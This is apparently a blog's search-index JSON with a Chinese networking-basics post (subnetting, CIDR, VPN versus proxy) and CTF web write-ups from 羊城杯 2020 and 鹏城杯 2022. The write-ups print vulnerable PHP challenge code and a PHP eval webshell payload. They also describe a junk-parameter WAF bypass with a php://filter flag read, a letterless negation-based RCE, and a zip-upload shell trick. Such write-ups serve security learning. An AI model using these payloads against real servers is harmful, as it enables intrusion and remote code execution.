restart\n\n我使用的是桥接模式，都可以ping通，其实很简单的道理\n由于是kali，网卡信息的位置不一样\n在这里\n/etc/network/interfaces\n\n要自己配\n子网与子网掩码ip就是我们刚刚上面分析的有多少类，子网掩码只有1和0来构成，子网掩码是1就代表是网络号，为0就是代表是主机号（二进制）\n比如255.255.255.0其实就是\n11111111 11111111 11111111 00000000\n主机号就是8位，网络号就是24位\n依靠子网掩码表示哪里是主机号哪里是网络号\n所以我们也可以依靠子网掩码区分网络\n一般来说我们依靠子网掩码来划分子网\n比如一个A类网络可以容纳16777214台主机\n但是这个太大了，他的子网掩码是255.0.0.0\n我们加长子网掩码到255.255.0.0这样我们就可以在A类网络里面得到256个B类子网，再加长到255.255.255.0我们每个B类子网就可以再得到256个C类子网\n当然你也可以不划分为256个子网，而划分为128个，64个，32个，16个，8个，4个，2个。\n最常见的255.255.255.0下的网络：就是主机号有八位，可以代表二的八次方，代表256个主机，但是不能是全零或者是全1，所有可以使用的位254\n也就是说\n255.255.255.0代表的c类网络下最多可以分配254个不同的ip地址\n一个B类网络的默认子网掩码为255.255.0.0，你如果想把它划分为2个子网，网络位数就成立17位，也就是说子网掩码就变成了255.255.128.0；想划分为16个子网，因为16是2的4次方，所以网络位数加4变成了20位，也就是说子网掩码加长，成了20位，就是255.255.240.0。依此类推。\n每个二进制位从8位的从前往后算\nDHCPDHCP指的是由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。提升地址的使用率。\nMAC MAC地址就如同我们身份证上的身份证号码，具有全球唯一性。\n服务器服务器的分类按照软件开发阶段来分，服务器可以大致分为2种\n（1）远程服务器别名：外网服务器、正式服务器使用阶段：应用上线后使用的服务器使用人群：供全体用户使用速度：服务器的性能、用户的网速\n（2）本地服务器别名：内网服务器、测试服务器使用阶段：应用处于开发、测试阶段使用的服务器使用人群：仅供公司内部的开发人员、测试人员使用速度：由于是局域网，所以速度飞快，有助于提高开发测试效率\n本地服务器的选择远程服务器就是本地内网服务器开放外网访问而已如果处于学习、开发阶段，自己搭建一个本地服务器即可\n端口物理：不讨论后续再聊\n逻辑：公认端口端口号从0到1023，不可以重新定义作用\n比如80就是http通信，23就是telnet服务\n注册端口服务范围是1025到49151这里每个端口都可以由用户自定义服务\nCIDR（无类或无类别域间路由）CIDR技术消除了传统A、B、C、D类地址以及划分子网的概念，将网络前缀从固定长度变为了可调节长度，更为有效的对IPv4地址进行了分配。CIDR使用网络前缀代替以往的子网络概念，具体标识方式为：IP地址后加上“&#x2F;”，“&#x2F;”后的数字标识网络前缀长度，类似192.14.32.0&#x2F;20的形式。\n\nCIDR技术是如何将网络地址与子网掩码相融合的呢？\n128.14.35.7&#x2F;20为某一CIDR地址块\n二进制：10000000 00001110 00100011 00000111\n最小地址：10000000 00001110 00100000 00000000 128.14.32.0\n最大地址：10000000 00001110 00101111 11111111 128.14.47.255\n地址掩码：11111111 11111111 11110000 00000000\n将地址掩码与IP地址相与均能得到网络号\n注意：最大和最小地址都是不能被分配给主机使用。CIDR不使用子网，但仍使用“掩码”一词，并且分配到一个CIDR地址块的组织，仍可以在本组织内根据需要划分出一些子网。\nLAN,WAN,WLAN,VLAN,VPN1、局域网LAN局域网就是小范围地区形成的一个区域网络，它的特点就是分布地区范围有较小，比如一栋小区，也可以是办公室之间的电脑设备之间的联系。\n比如某所大学，宿舍楼、教学楼，它们之间的内部网络就是典型的局域网LAN。\n\n局域网是一种私有的网络，相对其他形式网络传输速度更快，性能更稳定，框架搭建容易。它从一定程度上能防止信息泄露和外部网络病毒的攻击，一旦被黑客攻击，可能会导致整个网络的瘫痪。\n2、广域网WAN广域网是连接不同地区局域网或者城域网计算机通信的远程网，所覆盖的地区范围通常很大，一般在几十公里以上，它甚至能连接不同的城市或者国家等。\n我们普遍熟悉的互联网，属于一种公共型的广域网，它的成本比较低，是一种价格比较便宜的网上环境。\n\n3、无线局域网WLAN在计算机行业刚起步阶段，计算机之间的联系，只有通过网线连接。后来，无线技术被广泛应用到局域网当中中，WLAN就因此诞生了。\n目前无线局域网的应用越来越多，当前最广泛使用的当属Wi-Fi。只需要一个路由器，就可以让所有具有无线功能的设备，组成一个无线局域网，非常方便灵活、成本也比较低。\n4、虚拟局域网VLAN虚拟局域网是一组逻辑上的设备和用户，这些设备和用户互不受物理位置的限制，相互之间的通信就好像它们在同一个网段一样因此得名。\n\n为了让大家容易理解，举个例子。\n某科研机构划分出了很多个虚拟局域网，科研人员接到某个科研任务，于是将若干名科研人员组成一个科研小组。于是就从各个虚拟局域网里，抽调这些科研人员出来。这些科研人员可以在虚拟局域网中通信自如，同时他们也能保持和原来的虚拟局域网进行交流。\n5、虚拟私有网络VPN虚拟专用网络(VPN)的功能是：在公用网络上建立专用私有网络，然后进行加密通讯。在企业网络中有非常广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN可通过服务器、硬件、软件等多种方式实现。\n举个例子：\n很多公司为了方便出差人员远程办公，可以通过搭建公司内部的VPN网络，从而实现异地安全远程办公。\n代理和vpn代理何为代理服务器所谓代理服务器，是一个“中间人”的角色，在你和服务器之间传递数据。相当大比例的代理服务器可以以网站的形式存在，你只需打开代理服务器的网站，然后输入你希望访问的链接，就可以像平时浏览网页一样操作了。代理的工作原理是：由代理服务器自己去访问你的目标网站，并加载它的内容，然后再把这些加载过的内容传递到你的窗口上。这样就相当于你在浏览目标网站了。因此代理经常被叫做“梯子”或者“桥”。使用代理的好处是，你不需要直接链接到目标网站，因此目标网站就无法获取你的IP地址，取而代之获取的是代理服务器的IP地址。这样你就可以隐藏你的位置信息了。  当你访问大多数代理服务的时候，他们通常会要求你选择一个代理服务器所在的国家。你可以通过对应国家的代理服务器访问目标网站，这样目标网站就会认为你是在对应国家进行访问的。  比如，如果你想要访问的网站屏蔽了你所在的国家，那么你可以用代理服务器换上其他国家的IP，只要代理服务器所在的位置不在屏蔽范围之内，你就可以通过代理服务器实现访问了。\n使用代理服务器的好处如果你仅仅是要破除网站屏蔽，那么代理服务器可能是最简单便捷的方案了。由于所有的工作都是远程服务器完成的，你不需要安装任何东西，只需要访问代理服务器所在的网站，并选择一个国家就可以了。如果你发现某个网站被锁需要快速解决，代理非常适合作为临时解决方案。而正因为很多代理服务器用网页的方式提供服务，你可以在任何操作系统里使用它们。无需安装软件，只需要找到合适的服务器即可。当然，安装型的代理也是存在的，从手机APP到浏览器插件再到桌面应用程序都有，但在技术上这不是必要的。\n代理服务器的不足但代理服务器也有不足之处。如果你希望达成匿名浏览网站之外的目的，代理服务器或许并不能帮你做到这点。长期使用代理服务器，你会发现它会变慢而且速度并不稳定。而如果你不只是匿名希望浏览几个网站，而是希望匿名访问大量网站和网络应用，代理服务器的弊端就会很明显。\nVPN何为VPN表面上，VPN和代理服务器是很接近的。在VPN服务下，你传输的信息会先经过VPN服务器，然后再抵达目的地，反过来的接收过程也是一样。而VPN和代理的主要区别就在于你向服务器发送数据的这个环节。 使用VPN，你必须先安装VPN软件（Windows  10虽然自带，但也是一个软件）。在开启VPN软件后，软件的主要职责就是加密你的数据并传递给VPN服务器，这样你传输的数据对截获者来说就是不可读的。这个技术叫做“隧道”，是一个很形象的词语。想象一下，如果你开车在马路上行走，那么两侧的人能看到：谁在开车，车的型号是什么，车牌号是多少……而如果你在隧道里开车，隧道外的人是看不到这些的。\n使用VPN的好处因此就像你想的一样，VPN可以隐蔽你在互联网上的行为。反过来说，代理服务器并不难做到这一点，至少在你和代理服务器交换数据的这个阶段是做不到的，任何有能力的人（包括黑客和你的网络服务商）都能看到你在传输什么。而VPN则从你的主机建立了隧道，包括网络服务商在内的任何人都无法“看到”你传输的东西。  隐蔽意味着安全，如今整个互联网都在倡导各式各样的加密通讯，道理就在这里。很多不法分子会通过截取用户发出的数据包而窃取用户信息，但通过VPN你就不用担心这个问题了，对截获者来说你发出的加密数据包几乎等于垃圾数据。\nVPN的不足但不幸的是，VPN通常不便宜。理论上，除非你有必要将你的网络操作进行加密，否则购买VPN是没有必要的。相比之下，付费代理要便宜得多。  不仅如此，由于加密隧道是你的设备建立的，因此所有的离岸数据都是在你的设备上完成加密的。这可能会不同程度上拖慢你的设备速度，从而影响整个浏览体验。\n","categories":["工作"],"tags":["work","网络安全基础知识","计算机网络"]},{"title":"羊城杯","url":"/2023/05/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF/","content":"[羊城杯 2020]easycon以前好像做过，现在还是很无语\n\n就是随便试了一下index.php\n然后就可以了\n\n命令执行\n\n这里面的东西base64转图片\n\n受不了一点\n[羊城杯 2020]easyphp &lt;?php    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; \n\n代码审计\n利用点在最后\nfile_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n\n\n读入我们传入文件名和数据，然后去利用\n一点一点看这里是怎么保护的\nforeach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125; \n\n删除除了index.php外的所有的文件\nif(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;       highlight_file(__FILE__);       die();   &#125; \n\n接受content和filename两个变量，不然就寄\n$content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125; \n\n分别对content和filename两个变量进行过滤\nstristr函数就是返回这些东西之前的内容\nhttps://www.php.cn/faq/414974.html#:~:text=PHP,stristr%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%A8%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%BC%80%E5%A7%8B%E4%BD%8D%E7%BD%AE%E5%88%B0%E7%BB%93%E6%9D%9F%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%EF%BC%8C%E5%85%B6%E8%AF%AD%E6%B3%95%E6%98%AFstristr%20%28string%2Csearch%2Cbefore_search%29%EF%BC%8C%E5%8F%82%E6%95%B0string%E5%BF%85%E9%9C%80%EF%BC%8C%E6%98%AF%E8%A7%84%E5%AE%9A%E8%A2%AB%E6%90%9C%E7%B4%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9Bsearch%E5%BF%85%E9%9C%80%EF%BC%8C%E6%98%AF%E8%A7%84%E5%AE%9A%E8%A6%81%E6%90%9C%E7%B4%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82\n\npreg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1\n\n这个就是不能有小写字母和 .外的所有东西\n但是我们想要得到他服务器上的flag文件又该怎么做呢\npayload:\nfilename=flag.php&amp;content=&lt;?php eval($_GET[1]);?&gt;\n\n\n没有用被输出了\n","categories":["writeups"],"tags":["反序列化","java",".htaccess","数组绕过","SSRF","disable_function"]},{"title":"鹏城杯2022","url":"/2023/05/09/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022/","content":"[鹏城杯 2022]简单包含emmmm，应该是商用的最简单的waf，使用脏数据绕过\npayload：1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php\n\n\n用脏数据是waf绕过常用手段\n[鹏城杯 2022]简单的php&lt;?phpshow_source(__FILE__);    $code = $_GET[&#x27;code&#x27;];    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;,$code))&#123;        die(&#x27; Hello&#x27;);    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123;        @eval($code);    &#125;?&gt; \n\n很明显的无字符rce\n虽然说之前总结了，但是这次实战还是写不出来\n\n再根据这道题总结一下\n参考文章：https://www.cnblogs.com/0xo0Kerk/p/17236536.htmlhttps://blog.csdn.net/Manuffer/article/details/120738755\n\n学习一下什么是无参数RCE，现在才明白RCE中好像有无参数和无字符\n&lt;?php\tif(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])&#123; \t\t     eval($_GET[&#x27;exp&#x27;]);\t&#125;?&gt;\n\n看下这段代码，\n一点一点进行审计。\n‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[a-z,_]+((?R)?)&#x2F;‘这个如果对了，就执行 $_GET[‘exp’]，然后eval($_GET[‘exp’]);\n[a-z,_]匹配小写字母和下划线 +表示1到多个\n(?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。\n(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。\n大概是可以理解了\n\n再回头看这道题，就应该是无字母加上无参数rce一起上来\n我们先测试一下可用字符\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n\n有百分号和~\n取反\n&lt;?php$a=&quot;phpinfo&quot;;var_dump(urlencode(~$a));\n\n测试一手phpinfo\n\n一切都很顺利\n\n接下来开始准备rce\nsystem(current(getallheaders()));我们利用这一套修改信息头进行rce\n\n这里不断用脚本进行取反，然后%!FF或者!%FE都是为了给一个合法的函数名去补充，不然我们取反的函数字符字符串会被当作不合法的传入\n\n结束\n[鹏城杯 2022]压缩包 &lt;?phphighlight_file(__FILE__);function removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;function unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();        $zip-&gt;open($filename);        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;        if($zip-&gt;extractTo($dir))&#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);    ?&gt;[]Warning: mkdir(): No such file or directory in /var/www/html/index.php on line 21[][]\n\n开局很复杂吓人的源码\n代码审计\nfunction removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;\n\nscandir这个函数\n\n得到一个list\n然后去删除这些list里面的东西\n还有一个函数unzip($filename)\n待会分析\n$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);\n\n这是主要思路\n传入一个content\n然后删除tmp目录下面的所有东西，但是tmp目录还是在的\n/tmp/ 是一个 Linux&#x2F;Unix 系统中的临时目录，常用于存放临时文件，通常这些文件在系统重启时会被清空。\n然后他把$content经过md5后的文件名放到tmp文件路径下\n将 $content 变量中的 Base64 编码解码后，将结果写入到 $fpath 变量所代表的文件中，使用 PHP 内置函数 file_put_contents() 实现。具体的实现过程如下：\n\nbase64_decode($content) 将 $content 变量中的 Base64 编码解码成二进制数据\n\nfile_put_contents($fpath, ...) 将解码后的二进制数据写入到 $fpath 文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。\n\n\n最后echo了unzip函数里面的$fpath\n看看unzip函数\nfunction unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();//创建一个 ZipArchive 类的实例        $zip-&gt;open($filename);//打开，没有就创建        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);//在/static/upload/服务器的目录下面存入md5加密后的$filename        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;// 没有就创造        if($zip-&gt;extractTo($dir))//解压zip到dir        &#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);//unlink($filename) 方法用于删除 ZIP 文件，因为已经解压完成，ZIP 文件已经不需要了。        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;\n\n$zip = new ZipArchive(); 的作用是创建一个 ZipArchive 类的实例，以便使用该类提供的方法进行 ZIP 归档文件的操作。\n\nopen()：打开一个 ZIP 归档文件，如果文件不存在则创建它。\n\n分析完了什么都不懂。没有找到任何可用的点\n接下来是付神教我的方法。\n有一个p神博客：https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html\n思路是创造一个zip，然后让这个zip里面包含一个shell，但是解压的时候会出错，只能解压出shell.php\n为什么呢，这段源码经过审计，发现没有递归删除文件，也没有删除文件夹。\n具体操作\n\n\nhttps://www.yuque.com/zouyii/kteg8l/pnk84i4h17wfdhag#8f05a9f3\n","categories":["writeups"],"tags":["无参RCE","脏数据","取反构造","条件竞争","变量覆盖","路径穿越"]}]